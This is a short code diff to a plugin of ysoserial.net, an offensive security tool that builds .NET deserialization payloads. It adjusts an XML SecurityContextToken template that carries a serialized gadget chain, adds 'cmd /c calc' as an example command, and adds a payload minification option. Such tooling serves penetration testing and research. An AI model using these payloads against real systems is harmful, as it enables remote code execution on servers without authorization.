@@ -29,7 +29,7 @@ namespace ysoserial.Plugins
 
         static OptionSet options = new OptionSet()
             {
-                {"c|command=", "the command to be executed", v => command = v },
+                {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null }
             };
@@ -69,12 +69,17 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
             String payloadValue = "";
-            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc' Id='uuid-709ab608-2004-44d5-b392-f3c5bf7c67fb-1'>
+            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
 	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
-		urn:unique-id:securitycontext:1337
+		urn:unique-id:securitycontext:1
 	</Identifier>
 	<Cookie xmlns='http://schemas.microsoft.com/ws/2006/05/security'>{0}</Cookie>
 </SecurityContextToken>";
+
+            if (minify)
+            {
+                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+            }
 
             if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
             {
@@ -104,6 +109,11 @@ namespace ysoserial.Plugins
                 {
                     // there will be an error!
                 }
+            }
+
+            if (minify)
+            {
+                payload = Helpers.XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
